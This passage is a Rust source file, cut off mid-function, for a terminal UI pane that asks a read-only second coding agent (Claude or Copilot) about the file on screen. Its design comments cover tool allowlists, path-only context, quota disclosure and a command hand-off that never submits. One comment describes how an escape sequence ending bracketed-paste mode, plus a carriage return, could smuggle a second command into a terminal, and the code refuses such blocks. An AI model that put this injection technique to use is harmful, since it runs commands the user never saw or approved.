//! Asking a second copy of your agent about the thing you are already looking
//! at — or, with `F6`, about nothing in particular.
//!
//! The gap this is for is narrow and constant. You are reading a file in the
//! viewer, or a diff in the git pane, and a question comes up that is *about*
//! what is on screen — what does this call do, where is this written, is this
//! the only caller. Every way of answering it today costs the conversation in
//! the left pane: you interrupt a turn, or you queue the question and wait, or
//! you go and open a second terminal. This pane is a reader you can ask
//! without spending any of that, and it is deliberately the smallest of the
//! three agents abeam starts.
//!
//! ## It is whichever agent is being hosted, in whichever shape that one has
//!
//! [`ASKABLE`] is two names long and `crate::ask::Flavour` is what the pane
//! carries away from resolving one. Nearly everything below is the same either
//! way — the composer, the transcript, the hand-off, the scroll table — because
//! all of that is about a pane rather than about a protocol. What differs is
//! the section immediately after this one and one row of chrome, and both
//! differences are the same underlying fact: `crate::ask::copilot` cannot make
//! the promise the next paragraph is about.
//!
//! abeam will not start a Claude for a session that asked for Copilot. It hosts
//! the agent it was told to; a pane that quietly reached for the other one would
//! be spending an account the reader did not name, on a model they did not
//! choose, to answer a question about their repository.
//!
//! ## It reads, and the tool list is the proof rather than the promise
//!
//! **Under Claude.** `crate::ask` hands the child `--tools "Read,Grep,Glob"`,
//! which is an allowlist over the built-in set: what is not named there does not
//! exist for that session, so there is no `Write`, no `Edit` and no `Bash` to
//! permit or refuse. That is a claim about a *list*, and a claim about a list is
//! worth showing rather than asserting — so the tools that came back on
//! [`AskEvent::Ready`] are drawn along the bottom of the pane, and what is on
//! screen is what the child actually got. A pane that said "read-only" in its
//! own voice would be repeating abeam's intention back at the reader; this
//! repeats the child's answer.
//!
//! **Under Copilot there is no such list to show, and the row says so rather
//! than filling the gap.** `crate::ask::copilot` makes the claim from the other
//! side — `--deny-tool` for the kinds that can write, and no approval channel
//! for anything else that would need one — and Copilot sends nothing announcing
//! what it was given. So the row reads `copilot · no tool list to show`, and it
//! pointedly does *not* print the denylist: a list abeam chose, drawn in the
//! place a list the child reported goes, would be exactly the "abeam's intention
//! wearing the child's clothes" this pane's whole discipline is against. The
//! opening screen is where that is explained at length, because it is the one
//! screen with room — see [`AskPane::what_it_is`].
//!
//! The same row says the other thing a second agent costs, because nothing
//! else on screen would: **this session shares the user's quota with the agent
//! in the left pane.** It is the same account, the same limits and the same
//! money, and a reader who thinks of the right-hand pane as free will find out
//! from a rate limit in the middle of the conversation that matters. The
//! opening screen says it at length and this row says it for the rest of the
//! session, which is the same shape `crate::panes::queue` gives its dispatch
//! warning and for the same reason: a disclosure that vanishes with the first
//! answer is one nobody read.
//!
//! ## Context is a pointer, and never a payload
//!
//! `?` in the viewer or the git pane attaches an [`AskContext`] — a label and a
//! path — and the pane draws `▸ <label>` above the composer until the question
//! goes. What travels is the *path*, on its own line under what was typed. The
//! child stands in the same directory and has tools that read, so naming the
//! file is enough: it fetches what it needs and skips what it does not.
//!
//! **`F6` is the same pane with no context at all**, and is the answer to the
//! question that is not about a file — which is most of them, if you are typing
//! at the agent rather than reading. It is also the only thing that *detaches*:
//! an attachment survives until the question it rides on has gone, so without it
//! a `?` on the wrong file left the reader asking about that file or clearing
//! the whole conversation. Detaching is disclosed by the row above the composer
//! going away, on the frame the key was pressed.
//!
//! Shipping the body instead would mean a cap, a truncation notice, a decision
//! about how much of a four-thousand-line file to send, and a question that
//! silently carries part of somebody's repository off the machine. A path costs
//! one line on screen and is the *whole* of what was sent, which is what makes
//! the disclosure above the composer complete rather than a summary — and once
//! the question has gone the transcript carries the path with it, so what was
//! sent stays visible after the row does not.
//!
//! ## `Enter` never runs anything
//!
//! An answer full of shell commands is the ordinary shape of a useful answer,
//! and the distance between reading one and running it is where this pane could
//! do real harm. So there is exactly one route out of here and it ends at a
//! prompt: `Tab` picks a command out of the transcript, `Enter` on an empty
//! composer hands it to the shell view, and the shell **types it without
//! submitting** (`crate::panes::shell::send_command`, which is
//! `TerminalPane::send_text`). Nothing in this file starts a process, and
//! nothing in this file writes a newline at a shell.
//!
//! **A block of more than one line is never offered.** Not truncated, not
//! joined with `&&`, not offered as its first line — never offered, with the
//! reason drawn where the offer would have been. A command assembled out of
//! several lines by a program is indistinguishable, once it is sitting at a
//! prompt, from one the user read and approved; and the whole value of typing
//! it without a newline is that what is at the prompt is what was read. The way
//! through is the boring one and it is named on screen: copy it out of the
//! answer.
//!
//! **And a block carrying a control character is never offered either**, which
//! is the same promise defended one layer down. A hand-off is written to the
//! pty as a bracketed paste and nothing inside those two markers is escaped, so
//! a block holding `ESC[201~` and a carriage return would close paste mode
//! early and submit the rest — while the row of chrome above the composer drew
//! the escape as nothing at all. One line on screen, two commands at the
//! prompt. Refused rather than stripped: a command silently rewritten is one
//! nobody read, which is the objection to joining lines wearing a different
//! coat. See [`scan`], and [`crate::app`], which refuses the same string again
//! at the boundary where it would reach a terminal.
//!
//! ## One transcript, one renderer, one layout per frame
//!
//! Answers are markdown, and abeam already has a markdown renderer that wraps
//! to a known column count and produces rows a pane can scroll by
//! ([`crate::panes::viewer::markdown`]). This pane does not grow a second one.
//! The whole transcript — every question, every answer, every note — is built
//! into **one** markdown document and rendered as one, because rendering per
//! turn would mean a second wrapping model, a second set of prefixes, and a
//! seam down the middle of a document that a reader scrolls through as one
//! thing.
//!
//! That document is rebuilt on a revision counter and the rows are cached on
//! `(width, revision)`. A streaming answer arrives as dozens of deltas per
//! second and every one of them bumps the revision; only a *frame* pays for the
//! render, so a hundred deltas between two draws cost one layout rather than a
//! hundred. `builds` exists so a test can hold that to account, because the
//! difference is invisible from the outside and enormous on the frame path.
//!
//! ## Why the letters are letters
//!
//! The composer is live whenever the pane is available — there is no key that
//! opens it and none that closes it, because the pane exists to be typed into
//! and `Esc` has one meaning here. So `j`, `k`, `g`, `G`, `space` and `b` are
//! text, exactly as they are in `queue`'s composer, in the viewer's search box
//! and in the file list's find. What is left of `crate::scroll`'s table is the
//! half a typed query cannot contain — the arrows, `PgUp`/`PgDn`, `Home`/`End`
//! and `Ctrl+D`/`Ctrl+U` — and that half is claimed here in full, including
//! from the glance bindings, which the trait's default would otherwise decline
//! on a pane that takes typing.
//!
//! It is a real loss and it is worth naming rather than papering over: the F1
//! overlay promises `j` and `G` in every pane and they do not scroll here.
//! There is no arrangement that keeps both. A pane where `j` scrolls until you
//! have typed something is a pane where "just do X" scrolls the transcript
//! twice before it starts typing, which is worse than a documented absence.
//!
//! ## Following the bottom, unless somebody is reading
//!
//! While an answer streams the view stays on the bottom, because an answer you
//! cannot see arriving reads as a pane that has hung. The moment the reader
//! scrolls up it stops, and it stays stopped until they come back to the end —
//! `End`, or scrolling down to it. Yanking somebody back to the bottom because
//! four more tokens arrived is the same failure `crate::panes::viewer` spends
//! its module docs avoiding, one pane along.
//!
//! ## What this pane does not own
//!
//! It does not own the child. `crate::ask::AskSession` spawns a process and
//! writes to a pipe, and `Pane::tick` may not block — the same argument
//! `crate::panes::queue` makes about holding a `Dispatcher` it never runs. So
//! the pane holds the *answer* to "is there a Claude at all", resolved once
//! while it is being built, and the app owns the session: it drains
//! [`AskPane::take_question`], writes it to the child, and feeds what comes
//! back to [`AskPane::on_event`]. Which also makes every argument in this file
//! testable without a process anywhere near it.

use std::cell::OnceCell;
use std::path::PathBuf;
use std::time::Instant;

use anyhow::Result;
use crossterm::event::{KeyCode, KeyEvent, KeyModifiers, MouseEvent};
use pulldown_cmark::{CodeBlockKind, Event, Parser, Tag, TagEnd};
use ratatui::Frame;
use ratatui::layout::Rect;
use ratatui::style::{Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Block, Paragraph};
use unicode_width::UnicodeWidthStr;

use crate::ask::{AskEvent, Flavour, Step};
use crate::dispatch::Unavailable;
use crate::launch::{self, Launch};
use crate::pane::{Handled, Pane};
use crate::panes::viewer::{markdown, theme};
use crate::scroll::{self, Scroll};
use crate::text::{self, clip, clip_line, elide_left, plural};

/// What the composer writes in front of the draft. The same one `queue` uses,
/// because two composers in one program that disagree about their own prompt
/// are two things to learn.
const PROMPT: &str = "› ";

/// What marks the context attached to the next question, and the same mark the
/// transcript carries it under once it has gone.
const ATTACHED: &str = "▸ ";

/// What marks a command the pane is offering to type into the shell.
const COMMAND: &str = "⌘ ";

/// The agents this pane can ask, and which shape each one gets.
///
/// A table rather than a name, and written out rather than derived from
/// `crate::agent::AGENTS`, for `crate::dispatch`'s reason: that table answers
/// what abeam can *host*, and this one answers which of those have a print mode
/// this pane knows how to drive. The two are not the same question and the day a
/// third agent joins the first must not be the day this pane starts spawning
/// something that has never heard of either shape.
///
/// **The two entries are not equally well founded, and the pane says so where
/// it matters.** `crate::ask`'s Claude is a recorded observation with a version
/// and a date on it; `crate::ask::copilot` is GitHub's documentation, never run.
/// See [`AskPane::opening`], which is where a reader is told which of the two
/// they are looking at.
const ASKABLE: &[(&str, Flavour)] = &[("claude", Flavour::Claude), ("copilot", Flavour::Copilot)];

/// What the composer says while an answer is still arriving, after the count of
/// seconds it has been arriving for.
///
/// Short because it shares the bottom of a pane that is routinely forty-six
/// columns wide, where `answering 12s · enter waits · draft kept` is forty-one
/// cells and fits whole. Both halves a reader needs are in it — `enter` does
/// not send yet, and what they have typed is still there when it does. See
/// [`AskPane::submit`] for what a second question asked mid-answer does to the
/// first.
///
/// **The counter is the load-bearing part, and it is there because of a
/// measurement.** A probed question took 30.7 seconds and spent 28 of them
/// inside tool calls that put nothing on screen. A row that says `answering`
/// and nothing else says the same thing at second one and at second thirty,
/// which is exactly when a reader starts to wonder whether anything is
/// happening at all. A number that goes up cannot be mistaken for a pane that
/// has stopped.
const WAITING: &str = "enter waits · draft kept";

/// How to start again, offered beside the tool list once there is something to
/// start again *from*.
///
/// This row used to carry a warning that the pane spends the same quota as the
/// agent, and it is gone because it was answering a question nobody asked: it
/// is the same Claude, started by the same person, on the same account, and a
/// standing caution about that reads as though abeam had found something to be
/// alarmed about. The row is better spent on the thing a reader can act on.
///
/// Which is the same subject seen properly. The cost that is worth a row is not
/// *that* answers cost money — it is that a conversation kept open goes on
/// being re-sent as context, so the file you have finished with is still being
/// paid for. That has a key, and the key is what the row now says.
const CLEAR: &str = "ctrl+l clears";

/// Where a question came from, attached before it is sent and drawn until it
/// goes.
///
/// Two fields and not one, because they answer different questions. `label` is
/// what a reader recognises at a glance in a forty-six-column pane; `path` is
/// what the child is given, and is the whole of what leaves this machine. See
/// the module docs on why that is a pointer rather than a payload.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct AskContext {
    /// What the pane draws above the composer, e.g. `viewer.rs`.
    pub label: String,
    /// Handed to the child as a path. **Not as a payload.**
    pub path: PathBuf,
}

/// There is a Claude, and this is how to start it.
///
/// The pane resolves this once, on the first thing that asks, and never runs it
/// — exactly as `QueuePane` holds a `Dispatcher` it never dispatches with. Two
/// things follow. The pane can say *on the first frame it draws* that this
/// session has nothing to ask, rather than looking ordinary until the first
/// question fails; and the thing that blocks stays off a type the shell renders
/// every frame.
///
/// **On the first frame rather than on construction, and the difference is
/// measurable rather than theoretical.** [`resolve`] is a full PATH and PATHEXT
/// walk, and `App::sync_workspaces` builds a pane per newly discovered worktree
/// on the thread that draws: eight worktrees appearing at once cost 51 ms held
/// there, 50.1 ms of it here, against a `ShellPane::new` next door costing
/// 39 µs. That fires ten seconds into every session in a repository that has
/// worktrees. A workspace nobody asks in now pays nothing, which is the rule
/// the shell in the same struct has always kept.
#[derive(Debug)]
pub struct Ready {
    launch: Launch,
    /// Which of the two shapes the child will be driven in. Decided here, with
    /// the program, rather than re-derived from the agent's name at each of the
    /// four places that need it — the name and the shape are one answer and
    /// splitting them is how they come to disagree.
    flavour: Flavour,
}

/// One question and the answer accumulating under it.
#[derive(Clone, Debug, Default)]
struct Exchange {
    /// What the user typed, without the context line. The transcript shows the
    /// two separately because they came from different places.
    question: String,
    /// The path that went with it, if one was attached. Kept on the exchange
    /// rather than on the pane so that what was sent stays visible after the
    /// attachment row has gone.
    path: Option<String>,
    /// Everything `Delta` has carried so far. **Never replaced** — see
    /// [`AskPane::finish`], which is where the one thing that used to replace
    /// it is refused.
    answer: String,
    /// A fragment has arrived, so the stream is working and the answer on
    /// screen is the whole of what was said. What tells [`AskPane::finish`]
    /// whether the `result` line is a fallback or a repetition.
    streamed: bool,
    /// What the child said it was doing, oldest first. Progress and never
    /// content: nothing here came out of the answer.
    steps: Vec<Step>,
    /// The last thing to happen was a block of reasoning opening, so the child
    /// is thinking rather than running anything. Cleared by the next fragment
    /// or the next tool call, because both mean it has moved on.
    thinking: bool,
    /// Something interrupted the prose, so the next fragment begins a new
    /// paragraph rather than the sentence the last one ended.
    broken: bool,
    /// When the question went. abeam's own clock rather than the child's,
    /// because this one has to answer *while* the turn is running and nothing
    /// on the wire says how long it has been — the child's own number arrives
    /// on the `result` line, thirty seconds after the reader started wondering.
    started: Option<Instant>,
    cost_usd: Option<f64>,
    /// How long the child says the turn took, once it is over. Preferred to
    /// abeam's clock for the finished figure: it is measured across the whole
    /// turn by the process that ran it.
    duration_ms: Option<u64>,
    /// What the `result` line said went wrong, if it said anything.
    error: Option<String>,
    /// A `result` has been seen. The only reliable end of a turn there is.
    done: bool,
}

/// One thing that happened, in the order it happened.
enum Entry {
    Exchange(Exchange),
    /// Something the child said that is not an answer — a rate limit, a line
    /// that could not be read, the child going away.
    ///
    /// In the transcript rather than in a status line, and that is the point of
    /// it being an entry: these things happen *between* two answers, and a
    /// status line showing the latest one would misdate every one before it and
    /// lose all but the last. Nothing the reader threads report is dropped.
    ///
    /// `count` is how the rule "nothing is dropped" survives a child that says
    /// the same thing forty times. A pipe that has started failing fails on
    /// every read, and forty identical warnings do not carry forty times the
    /// information of one — they carry the same information and bury the
    /// answer it interrupted. So a repeat is counted rather than appended, and
    /// the count is drawn: the reader is told it happened, and how often, in
    /// one line.
    Note { text: String, count: usize },
}



/// The pane.
pub struct AskPane {
    root: PathBuf,
    /// The hosted agent's name, kept because the question "is there anything to
    /// ask" is no longer answered before anybody has asked it.
    agent: String,
    /// Whether there is anything to ask, decided once — on the first thing that
    /// needs the answer rather than on construction. See [`Ready`], which is
    /// where the cost of deciding early is written down, and [`AskPane::ready`],
    /// which is the only reader of this field.
    ready: OnceCell<Result<Ready, Unavailable>>,

    entries: Vec<Entry>,
    /// What is being typed. Always live while the pane is available — see the
    /// module docs on what that costs the scroll table.
    composing: String,
    /// Attached by the pane that had `?` pressed in it, and consumed by the
    /// question it rides on.
    context: Option<AskContext>,

    /// The tools `Ready` reported. `None` until the child has said, and drawn
    /// as "no reader yet" rather than as an optimistic list — this row's whole
    /// job is to be the child's answer rather than abeam's intention.
    tools: Option<Vec<String>>,
    /// stdout closed. The child is gone and a new question is what starts
    /// another.
    ended: bool,

    /// Drained by the app, which owns the child. Mirrors
    /// `QueuePane::take_send_request`: a request left sitting fires late, at
    /// whatever unrelated moment next reads it.
    pending: Option<String>,
    /// The reader has asked to start again, and the **child has to go with the
    /// transcript**.
    ///
    /// This is the whole reason clearing is not just `entries.clear()`. What
    /// costs money is not the rows on screen, it is the conversation the child
    /// is holding: every turn is sent again as context on the next one, so a
    /// reader who has finished with one file and pressed `?` on another goes on
    /// paying for the first until the session itself ends. Emptying the pane
    /// and keeping the child would clear the evidence and leave the bill.
    ///
    /// Drained by the app, which owns the child, for the reason [`pending`]
    /// is — and the app drops the session rather than telling it anything,
    /// because there is no "forget" on the other end of that pipe. The next
    /// question starts a new child with a new session id, which is disowned
    /// like any other.
    ///
    /// [`pending`]: AskPane::pending
    reset: bool,
    /// The command the reader chose, drained by the app, which switches to the
    /// shell and types it **without a newline**.
    handoff: Option<String>,

    /// The single-line commands the transcript is offering, oldest first, and
    /// how many blocks were refused for spanning several lines.
    commands: Vec<String>,
    skipped: usize,
    /// Which command is selected, counted **from the end**.
    ///
    /// From the end rather than from the start so that the newest command stays
    /// selected as more arrive, which is what a reader who has just been handed
    /// one means by "that one" — and it needs no second flag to remember
    /// whether they have chosen for themselves, because choosing moves them off
    /// zero and staying there is the choice not to.
    from_end: usize,
    /// The revision `commands` was scanned at.
    scanned: Option<u64>,

    /// Bumped by anything that changes the transcript. The cache key, with the
    /// width.
    revision: u64,
    lines: Vec<Line<'static>>,
    laid_out: usize,
    laid_rev: Option<u64>,
    /// How many times the transcript has actually been laid out. A test's only
    /// way to prove the cache is one; see the module docs.
    #[cfg(test)]
    builds: usize,

    scroll: Scroll,
    /// Whether the view is pinned to the bottom. False the moment the reader
    /// scrolls off it, true again when they come back.
    following: bool,
    /// A frame is owed. Set by [`AskPane::on_event`], because the app feeds
    /// this pane from a thread's worth of output and `tick` is where a pane
    /// asks to be redrawn.
    owed: bool,
    /// The second [`Pane::tick`] last claimed a frame for. What keeps the
    /// waiting counter to one frame a second rather than one a pass.
    ticked: Option<u64>,

    theme: theme::Mode,
    drawn: Rect,
}

impl AskPane {
    /// `agent` is the hosted agent's name, which decides whether there is
    /// anything to ask at all.
    ///
    /// It is *kept* rather than acted on: nothing here walks the machine, so
    /// building a workspace costs a `String`. See [`Ready`] for what that walk
    /// costs when it happens on the thread that draws.
    pub fn new(root: PathBuf, agent: &str) -> Self {
        Self::with_ready(root, agent.to_string(), OnceCell::new())
    }

    /// The same pane, with the availability decision handed in rather than
    /// looked up — and, in a test, with no child anywhere near it.
    ///
    /// [`resolve`] walks the real machine, and the answer changes this pane by
    /// a whole row: an unavailable ask draws a notice above the body that
    /// everything below is offset by, and takes no typing at all. A test built
    /// the ordinary way would pass or fail depending on whether the machine
    /// running it has Claude installed, which is not a property a test may
    /// have. `QueuePane::with_dispatcher` is the same seam for the same reason.
    ///
    /// Handing the answer in also fills the cell, so a pane built this way
    /// never walks anything however often it is drawn — which is why the agent
    /// name below is [`AGENT`] rather than an argument nobody could supply: it
    /// is the name a resolve would have used, and no resolve can happen here.
    ///
    /// `#[cfg(test)]` since availability went lazy. It used to be the seam
    /// [`AskPane::new`] itself went through, and is now a seam only a test
    /// needs — so it is compiled only where it is called, rather than left
    /// behind an `allow` that says a shipped build has a constructor nobody
    /// reaches.
    ///
    /// `flavour` is handed in beside the launch rather than guessed from it,
    /// because the two rows that differ between the agents — the opening screen
    /// and the capability line — are the whole of what a test of this pane would
    /// otherwise be unable to reach without a `copilot` on the machine. There is
    /// no `copilot` on the machine this was written on.
    #[cfg(test)]
    pub fn with_launch(
        root: PathBuf,
        flavour: Flavour,
        launch: Result<Launch, Unavailable>,
    ) -> Self {
        let ready = OnceCell::new();
        let _ = ready.set(launch.map(|launch| Ready { launch, flavour }));
        Self::with_ready(root, flavour.agent().to_string(), ready)
    }

    /// Whether there is a Claude to ask, resolved on the first thing that needs
    /// the answer and remembered.
    ///
    /// `&self` and a [`OnceCell`] rather than a `&mut self` that fills a field,
    /// because the answer is wanted by [`Pane::title`], [`Pane::exit_hint`] and
    /// [`Pane::cursor`], which are `&self` by the trait — and by
    /// [`Pane::render`], which is the frame that pays for it. One cell rather
    /// than a resolve per caller: a PATH walk repeated every frame would be a
    /// worse bug than the one this replaced.
    fn ready(&self) -> &Result<Ready, Unavailable> {
        self.ready.get_or_init(|| resolve(&self.agent))
    }

    /// Which shape the child is driven in, or `None` when there is no child to
    /// drive.
    ///
    /// Read by the two rows that cannot be written once for both agents — the
    /// opening screen and the capability line — and by `crate::app`, which does
    /// the starting. It is deliberately not a field: the answer lives with the
    /// program in [`Ready`], because the pane that has resolved one has resolved
    /// the other in the same breath.
    pub fn flavour(&self) -> Option<Flavour> {
        self.ready().as_ref().ok().map(|ready| ready.flavour)
    }

    /// The one place every field starts, so two constructors cannot drift.
    fn with_ready(
        root: PathBuf,
        agent: String,
        ready: OnceCell<Result<Ready, Unavailable>>,
    ) -> Self {
        Self {
            root,
            agent,
            ready,
            entries: Vec::new(),
            composing: String::new(),
            context: None,
            tools: None,
            ended: false,
            pending: None,
            reset: false,
            handoff: None,
            commands: Vec::new(),
            skipped: 0,
            from_end: 0,
            scanned: None,
            revision: 0,
            lines: Vec::new(),
            laid_out: 0,
            laid_rev: None,
            #[cfg(test)]
            builds: 0,
            scroll: Scroll::default(),
            following: true,
            owed: false,
            ticked: None,
            theme: theme::Mode::default(),
            drawn: Rect::ZERO,
        }
    }

    // --- what the shell asks of it ----------------------------------------

    /// What to start the child with, or `None` when there is nothing to start.
    ///
    /// The pane resolved this and does not use it: starting a process blocks
    /// and `Pane::tick` may not, so whoever owns the session is the one that
    /// runs it. `crate::dispatch`'s `Dispatcher` is held by `QueuePane` on
    /// exactly the same terms.
    pub fn launch(&self) -> Option<&Launch> {
        self.ready().as_ref().ok().map(|ready| &ready.launch)
    }

    /// The next question to write to the child, if one has been submitted.
    ///
    /// Draining, not peeking, and the same contract as
    /// `QueuePane::take_send_request`: a request left sitting fires late, at
    /// whatever unrelated moment next reads it. There is one route by which
    /// anything leaves this pane for the child and this is it.
    ///
    /// What comes back is what the *child* is given: the typed question, and
    /// under it the attached path on a line of its own. Both halves are on
    /// screen — the question in the transcript, the path with it — because a
    /// pane that sends more than it shows is the same class of surprise as one
    /// reporting somebody else's work.
    pub(crate) fn take_question(&mut self) -> Option<String> {
        self.pending.take()
    }

    /// The question `Enter` turned what was typed into, if it turned it into
    /// one at all.
    ///
    /// **A peek, where every other seam out of this pane drains — and it is
    /// test-only for exactly that reason.** [`AskPane::submit`] refuses a
    /// question while an answer is still arriving, and *claims* the key when it
    /// does: `Handled::No` would let `Enter` fall through to the shell, which
    /// reads it as "done with this pane". So the refusal is invisible to the
    /// caller. A test that presses `Enter` and checks only that the key was
    /// handled therefore passes for a question that never left the composer,
    /// and then fails three steps later in an assertion about session ids that
    /// names nothing which happened — which is what `crate::app`'s ask tests
    /// did on two CI runs, in two different places, for one dropped question.
    /// This is the fact those assertions should have been made of.
    ///
    /// **The text and not a `bool`, which is a correction rather than a
    /// convenience.** `pending.is_some()` answers "is *a* question waiting",
    /// and the caller means "is *this* one" — so two questions asked with no
    /// drain between them would have passed for the second having been taken,
    /// on the strength of the first still sitting here. That is the same defect
    /// as the one this accessor exists to catch, one level up.
    ///
    /// What comes back is what will be *sent*, which is not always what was
    /// typed: an attached context puts the path under the question on a line of
    /// its own (see [`AskPane::submit`]), so a caller comparing against what
    /// somebody typed wants `starts_with` rather than equality. That is a fact
    /// about this pane's disclosure rule and not a caller being lax.
    #[cfg(test)]
    pub(crate) fn question_waiting(&self) -> Option<&str> {
        self.pending.as_deref()
    }

    /// Whether another question would be taken rather than refused, asked
    /// **without draining anything**.
    ///
    /// The not-draining is the whole reason this exists rather than the tests
    /// reading liveness off the session. "The child has gone" and "the pane
    /// will take another question" are two different facts, and they become
    /// true in either order: the first when `AskSession::poll` sees stdout
    /// close — or earlier still, when a write to a pipe whose other end has
    /// gone clears `live` without anything having been polled at all — and the
    /// second only when the `Turn` that closes the open exchange reaches
    /// [`AskPane::on_event`]. A test that waits for the first and then asks is
    /// racing the second, and loses it by dropping the question. This is the
    /// condition the next question actually has to get past.
    ///
    /// It touches nothing, which is what makes it usable by
    /// `a_question_asked_on_the_pass_that_notices_the_child_has_gone_still_goes`
    /// next door: that test's whole subject is the pass where the child's
    /// ending is *still in the channel*, so a readiness question that drained
    /// anything to answer would delete the test rather than steady it.
    #[cfg(test)]
    pub(crate) fn ready_for_a_question(&self) -> bool {
        !self.streaming()
    }

    /// Whether the reader has asked to start again, in which case the app must
    /// drop the child as well as let this pane empty itself.
    ///
    /// Drained rather than read, so that a reset acted on once is not acted on
    /// for ever — the same rule every other seam out of this pane follows.
    pub(crate) fn take_reset(&mut self) -> bool {
        std::mem::take(&mut self.reset)
    }

    /// Empty the conversation and ask for the child to go with it.
    ///
    /// What is *not* cleared is worth as much as what is. The composer keeps
    /// what is in it, because clearing a conversation and clearing a
    /// half-written question are two different intentions and only one of them
    /// was expressed; and the attached context stays, because the reader
    /// pressed `?` on a file and then asked to start again *about that file* —
    /// throwing the attachment away would make the next question the one thing
    /// they did not ask for.
    ///
    /// `tools` goes back to `None`, which draws as "no reader yet" rather than
    /// as the list the last child reported. There is no child now, and a row
    /// that kept saying `Read Grep Glob` would be describing a process that
    /// does not exist — this pane's one standing rule is that the row is the
    /// child's answer and never abeam's intention.
    fn clear(&mut self) {
        self.entries.clear();
        self.commands.clear();
        self.skipped = 0;
        self.from_end = 0;
        self.scanned = None;
        self.tools = None;
        self.ended = false;
        self.handoff = None;
        self.scroll = Scroll::default();
        self.following = true;
        self.reset = true;
        self.bump();
    }

    /// A single-line command the reader chose to hand to the shell.
    ///
    /// Taken by the app, which switches to the shell view and types it
    /// **without a newline**. Nothing here runs it, and nothing here can: see
    /// the module docs.
    pub fn take_command(&mut self) -> Option<String> {
        self.handoff.take()
    }

    /// Context to attach to the next question.
    ///
    /// Compared **by path**, and the whole context at that, because the label is
    /// a file name and file names repeat: this repository has fourteen
    /// `mod.rs` files. Comparing labels meant `?` on `src/ask/mod.rs`, `Esc`,
    /// then `?` on `src/panes/mod.rs` took the early return and left the *first*
    /// path attached while the row above the composer named the second — the
    /// pane sending something other than what it disclosed, which is the one
    /// thing the whole design rests on not doing.
    ///
    /// Compared at all because `?` pressed twice on the same file is one
    /// attachment, and re-attaching what is already attached would be a frame
    /// spent redrawing an identical row. A frame here re-renders the agent's
    /// whole screen. That is the whole of the reason: nothing in abeam re-offers
    /// a context on its own — `App::pump` calls this once per `?`, out of a
    /// drained `AskRequest`.
    pub fn attach(&mut self, ctx: Option<AskContext>) {
        if ctx == self.context {
            return;
        }
        self.context = ctx;
        self.owed = true;
    }

    /// Start on a chosen palette, before anything has been drawn.
    ///
    /// This pane paints its own background, because it draws through the
    /// viewer's markdown renderer and that renderer's colours are absolute RGB
    /// chosen against a known page — see `crate::panes::viewer::theme`. Once a
    /// background is painted every colour on top of it has to be owned too, so
    /// a reader in a light session must be able to say so here as well as
    /// there.
    pub fn set_theme(&mut self, theme: crate::config::Theme) {
        let mode = match theme {
            crate::config::Theme::Dark => theme::Mode::Dark,
            crate::config::Theme::Light => theme::Mode::Light,
        };
        if self.theme != mode {
            self.theme = mode;
            // The laid-out transcript holds baked styles, so a palette that
            // only took effect on the next answer would be a setting that did
            // nothing.
            self.laid_rev = None;
            self.owed = true;
        }
    }

    /// One line of the child's output, folded into the transcript.
    ///
    /// The app's half of the arrangement in the module docs: it owns the
    /// session, drains it, and hands the events here. Which is also what makes
    /// every claim in this file testable — nothing below needs a process to be
    /// driven through it.
    pub(crate) fn on_event(&mut self, ev: AskEvent) {
        match ev {
            // `session_id` and `model` are deliberately dropped. The id is
            // abeam's own — it chose it, and `crate::agentstate` is what needs
            // it — and the model is a fact about *what* is answering where this
            // row is about what it may *do*. Naming both would cost the tool
            // list its columns in a forty-six-column pane.
            AskEvent::Ready { tools, .. } => {
                self.tools = Some(tools);
                self.ended = false;
                self.owed = true;
            }
            AskEvent::Delta(text) => {
                match self.open_exchange() {
                    Some(i) => {
                        if text.is_empty() {
                            // Nothing changed, so nothing is owed. A frame here
                            // re-renders the agent's whole screen.
                            return;
                        }
                        if let Entry::Exchange(x) = &mut self.entries[i] {
                            // The break the wire does not carry. Two text
                            // blocks either side of a tool call are two
                            // messages, and the fragments of both arrive with
                            // nothing between them — so `…read the file
                            // first.Ctrl+U is already bound…` is what
                            // concatenation produces, and it is what the reader
                            // sees the moment the answer stops being deleted at
                            // the end of the turn. A blank line is the markdown
                            // for "these are two paragraphs", which is what
                            // they are.
                            if x.broken && !x.answer.ends_with('\n') {
                                x.answer.push_str("\n\n");
                            }
                            x.broken = false;
                            x.answer.push_str(&text);
                            x.streamed = true;
                            // Words are arriving, so whatever it was thinking
                            // about it has finished thinking about.
                            x.thinking = false;
                        }
                    }
                    // A fragment with no question above it is not something to
                    // throw away: it is either a bug in the reader or a turn
                    // abeam did not know it had started, and both are worth
                    // seeing.
                    None => self.note(format!(
                        "an answer arrived with no question above it: {}",
                        clip(&one_line(&text), 200)
                    )),
                }
                self.bump();
            }
            // The two progress events, which are the only things in this file
            // that are dropped when there is nowhere to put them.
            //
            // **And that is not the rule bending.** "Nothing the reader threads
            // report is dropped" is a rule about what the child *said* — its
            // answers, its complaints, its reasons. These two say neither: they
            // are abeam's own account of a turn being under way, and an account
            // of a turn abeam has no record of is not something a reader can
            // use. It would also be the loudest possible way to fail, since
            // these arrive a dozen times a question.
            AskEvent::Using(steps) => {
                if let Some(x) = self.working() {
                    x.steps.extend(steps);
                    x.thinking = false;
                    // Whatever it says next is a new message and so a new
                    // paragraph. See the `Delta` arm, which is where that is
                    // spent.
                    x.broken = !x.answer.is_empty();
                    self.bump();
                }
            }
            AskEvent::Thinking => {
                if let Some(x) = self.working().filter(|x| !x.thinking) {
                    x.thinking = true;
                    x.broken = !x.answer.is_empty();
                    self.bump();
                }
            }
            AskEvent::Turn {
                text,
                cost_usd,
                duration_ms,
                error,
            } => {
                match self.open_exchange() {
                    Some(i) => {
                        if let Entry::Exchange(x) = &mut self.entries[i] {
                            finish(x, text);
                            x.cost_usd = cost_usd;
                            x.duration_ms = duration_ms;
                            x.error = error;
                            x.thinking = false;
                            x.done = true;
                        }
                    }
                    None => self.note(format!(
                        "a turn ended with no question above it: {}",
                        clip(&one_line(&text), 200)
                    )),
                }
                self.bump();
            }
            AskEvent::RateLimited(why) => {
                // Worth its own entry rather than a colour on the title,
                // because it is the one message here a reader has to act on —
                // and the action is to stop. Said plainly rather than as a
                // caution about spending: it is the same account as the agent
                // in the left pane, so this is news about the account rather
                // than about this pane in particular.
                //
                // Passed on whole, with no `rate limited:` in front of it. That
                // prefix was there when this event arrived for every session
                // whether or not anything was wrong and the sentence behind it
                // could be anything; now the event only fires when something
                // *is* wrong and `crate::ask::proto::limit` says which of the
                // two things it is. Announcing "rate limited" over a sentence
                // reading "Claude is close to a usage limit" would be abeam
                // contradicting the only party that knows.
                self.note(why);
            }
